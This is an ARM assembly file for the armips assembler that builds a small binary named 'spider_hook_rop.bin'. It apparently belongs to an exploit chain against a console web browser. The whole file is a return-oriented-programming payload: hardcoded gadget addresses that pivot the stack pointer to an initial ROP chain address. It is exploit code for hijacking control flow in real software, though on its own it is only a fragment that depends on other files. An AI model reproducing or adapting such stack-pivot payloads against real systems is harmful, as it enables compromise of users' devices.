.nds

.include "../../build/constants.s"

.create "spider_hook_rop.bin",0x0

.orga 0x0
	.word 0x0013035c ; pop {lr, pc}
		.word SPIDER_INITIALROP_ADR ; lr => sp
	.word 0x00130358 ; mov sp, lr | pop {lr, pc}

.Close
